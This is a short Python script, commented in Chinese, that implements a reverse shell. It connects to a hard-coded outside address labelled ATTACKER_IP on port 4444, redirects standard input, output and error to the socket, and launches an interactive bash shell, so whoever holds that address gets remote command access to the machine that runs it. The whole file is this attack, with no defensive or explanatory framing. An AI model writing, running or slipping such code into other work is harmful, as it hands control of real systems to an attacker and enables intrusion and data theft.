import socket
import subprocess
import os

# 配置你的服务器 IP 和端口
ATTACKER_IP = "35.208.178.225"
ATTACKER_PORT = 4444

def run_reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        # 重定向标准输入/输出/错误到 Socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        # 执行交互式 Bash Shell
        subprocess.call(["/bin/bash", "-i"])
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    run_reverse_shell()
